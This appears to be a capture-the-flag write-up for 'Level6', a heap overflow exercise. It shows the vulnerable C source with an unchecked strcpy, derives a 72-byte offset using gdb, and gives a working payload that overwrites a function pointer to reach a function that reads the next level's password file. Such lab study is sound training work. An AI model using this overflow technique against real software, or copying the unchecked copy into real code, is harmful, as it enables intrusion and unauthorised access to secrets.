# Level6

## Code
```
#include <string.h>
#include <stdlib.h>

void n() {
    system("/bin/cat /home/user/level7/.pass");
}

void m() {
    puts("Nope");
}

int main(int ac, char **av) {
    int *buffer;
    void (**f)(void);

    buffer = (char *)malloc(64);
    f = (void (**)(void))malloc(4);

    *f = m;
    strcpy(buffer, av[1]);
    (*f)();
}
```

# Explanation

- Here we have a main() that calls malloc twice to allocate a 64 bytes buffer and a pointer to
    function, and then calls strcpy on the buffer with argv[1] as a source.

- Since it doesn't take into account the length, strcpy is very unsecure, and that's what we're 
    going to exploit. We can make argv[1] longer than the 64 bytes of the buffer and overflow it.

- The program also contains a m() function that just prints "Nope" and a n() function that is
    basically a win function, which is of course never called by main().

- We noticed that the pointer to function was given the address of the m() function so we immediately
    understood that the goal of the exercise was to make it point to n() instead.

- Using gdb, we put 2 breakpoints after both calls to malloc() to get the return addresses contained
    in eax (or we could also use ltrace to get these addresses): \
```
buffer's address :   0x804a008	    (134520840 in decimal)
pointer on func :    0x804a050      (134520912 in decimal)
```

- So, with a simple operation (134520912- 134520840 = 72), we can get the offset from the beginning
    of our buffer to where we need to write the address of the n() function.

# Exploit

- Here's our final payload:
```
$    ./level6 `python -c 'print("A"*72 + "\x54\x84\x04\x08")'`
```
